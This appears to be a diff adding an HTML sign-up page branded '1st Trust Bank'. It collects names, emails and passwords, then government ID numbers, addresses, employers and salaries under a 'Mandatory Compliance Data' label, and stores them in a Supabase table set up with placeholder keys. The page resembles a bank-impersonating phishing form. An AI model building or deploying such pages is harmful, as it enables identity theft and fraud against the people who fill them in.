@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>1st Trust Bank | Secure Access</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+body {
+background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=2070&auto=format&fit=crop');
+background-size: cover; background-position: center; color: white; font-family: 'Inter', sans-serif;
+}
+.glass-card { background: rgba(10, 10, 10, 0.85); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
+.input-box { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 16px; width: 100%; border-radius: 12px; margin-bottom: 12px; }
+.animate-fade { animation: fadeIn 0.6s ease-out; }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+</style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-6">
+
+<!-- Step 1: Initial Credential Creation -->
+<div id="step-1" class="glass-card p-10 rounded-[2rem] w-full max-w-sm text-center shadow-2xl animate-fade">
+<h2 class="text-2xl font-light mb-8">Establish Credentials</h2>
+<input type="text" id="full-name" placeholder="Full Name" class="input-box">
+<input type="email" id="email" placeholder="Email" class="input-box">
+<input type="password" id="pass" placeholder="Password" class="input-box">
+<input type="password" id="pass-conf" placeholder="Confirm Password" class="input-box">
+<button onclick="validateStep1()" class="w-full bg-emerald-600 py-4 rounded-xl font-bold mt-4">CONTINUE TO VERIFICATION</button>
+</div>
+
+<!-- Step 2: Executive Verification (Hidden Initially) -->
+<div id="step-2" class="hidden glass-card p-10 rounded-[2rem] w-full max-w-sm text-center shadow-2xl animate-fade">
+<h2 class="text-2xl font-light mb-2">Executive Verification</h2>
+<p class="text-[10px] text-slate-400 mb-8 uppercase tracking-widest">Mandatory Compliance Data</p>
+<input type="text" id="id-card" placeholder="Government ID Number" class="input-box">
+<input type="text" id="phone" placeholder="Phone Number" class="input-box">
+<input type="text" id="address" placeholder="Residential Address" class="input-box">
+<input type="text" id="work" placeholder="Employer / Work" class="input-box">
+<input type="number" id="salary" placeholder="Monthly Salary" class="input-box">
+<button onclick="finalizeSignup()" class="w-full bg-emerald-600 py-4 rounded-xl font-bold mt-4">FINALIZE APPLICATION</button>
+</div>
+
+<script>
+const sb = supabase.createClient('YOUR_URL', 'YOUR_KEY');
+let tempUser = {};
+
+function validateStep1() {
+const p1 = document.getElementById('pass').value;
+const p2 = document.getElementById('pass-conf').value;
+if (p1 !== p2) return alert("Passwords do not match.");
+
+// Store data temporarily
+tempUser = {
+full_name: document.getElementById('full-name').value,
+email: document.getElementById('email').value
+};
+
+document.getElementById('step-1').classList.add('hidden');
+document.getElementById('step-2').classList.remove('hidden');
+}
+
+async function finalizeSignup() {
+const accNum = '1T-' + Math.floor(Math.random() * 90000000);
+const finalData = {
+...tempUser,
+id_card: document.getElementById('id-card').value,
+phone: document.getElementById('phone').value,
+address: document.getElementById('address').value,
+work: document.getElementById('work').value,
+salary: document.getElementById('salary').value,
+account_number: accNum
+};
+
+const { error } = await sb.from('users').insert([finalData]);
+error ? alert("Submission failed: " + error.message) : alert("Application Received. Account: " + accNum);
+}
+</script>
+</body>
+</html>
